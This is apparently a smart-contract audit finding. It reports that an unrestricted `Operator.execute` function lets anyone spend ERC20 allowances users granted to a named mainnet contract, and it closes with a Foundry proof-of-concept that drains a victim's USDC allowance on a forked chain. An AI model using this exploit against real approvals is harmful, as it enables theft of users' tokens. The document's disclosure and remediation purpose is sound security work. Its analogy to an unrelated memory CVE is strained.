### Title
Unrestricted `Operator.execute` lets anyone spend ERC20 allowances granted to the Operator - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary

`Operator.execute` accepts an arbitrary target, value, and calldata and invokes the target from the `Operator` contract. For non-Synth contracts, `msg.sender` remains `Operator`, so an attacker can call `transferFrom(victim, attacker, amount)` on any ERC20 token for which the victim has approved `Operator`. This allows theft of user-approved assets without the victim initiating the transaction. [1](#0-0) [2](#0-1) 

### Finding Description

`execute` is publicly callable and performs each user-supplied call through `Address.functionCallWithValue`. It does not restrict call targets, function selectors, token addresses, or ERC20 allowances. [3](#0-2) 

`SynthContext` translates `msg.sender == operator` into the original EOA only for contracts that implement `SynthContext`. Ordinary ERC20 contracts do not perform this translation and therefore authorize calls based on allowances granted to the `Operator` address. [2](#0-1) 

A victim who approves the deployed `Operator` for a batched operation permanently grants every future caller the ability to spend that allowance. The attacker only needs to call `execute` with the token contract as `target` and `transferFrom(victim, attacker, amount)` as `callData`. The deployed mainnet `Operator` is `0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360`. [4](#0-3) 

This is the Solidity analogue of an attacker-controlled request causing an arbitrary release of resources: malformed cache offsets release unintended memory in CVE-2016-5384, while an attacker-selected call releases ERC20 allowances held by `Operator`.

### Impact Explanation

The attacker can directly steal ERC20 tokens from any account with an outstanding allowance to `Operator`, up to that allowance. The attacker can also transfer any ERC20 balance accidentally held by `Operator` by invoking the token's `transfer` function. [5](#0-4) 

The `value-mismatch` check only compares native-call values and does not constrain ERC20 transfers or other state-changing calls. [6](#0-5) 

### Likelihood Explanation

Exploitation requires a victim to have granted an ERC20 allowance to `Operator`, or requires `Operator` to hold recoverable tokens. Such an allowance is plausible because the contract is explicitly designed to execute calls on users' behalf and is deployed as shared infrastructure rather than as a per-user executor. [7](#0-6) [4](#0-3) 

The issue is conditional on existing allowances or balances, but exploitation is permissionless once either condition exists.

### Recommendation

Do not expose unrestricted arbitrary calls under shared `Operator` ownership.

- Restrict `target` and selectors to a reviewed allowlist, or remove arbitrary external-call support.
- Use per-user authorization semantics that ordinary token contracts can validate rather than shared `Operator` allowances.
- Document that users must never approve ERC20 tokens to `Operator` if arbitrary calls remain.
- Add a recovery-free design or governor-only sweeping only if tokens are accidentally held; do not rely on arbitrary calls as the recovery mechanism.
- Remove the unchecked sum only as defense-in-depth; it does not address the ERC20 allowance issue. [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IOperator} from "../contracts/interfaces/IOperator.sol";

contract OperatorAllowanceTheftTest is Test {
    IOperator internal constant OPERATOR =
        IOperator(0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360);

    IERC20 internal constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function test_AttackerSpendsVictimAllowance() external {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        uint256 amount = 100e6;

        deal(address(USDC), victim, amount);

        // The victim approves the shared Operator for a legitimate operation.
        vm.prank(victim);
        USDC.approve(address(OPERATOR), amount);

        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(USDC),
            value: 0,
            callData: abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                victim,
                attacker,
                amount
            )
        });

        vm.prank(attacker);
        OPERATOR.execute(calls);

        assertEq(USDC.balanceOf(attacker), amount);
        assertEq(USDC.balanceOf(victim), 0);
    }
}
```
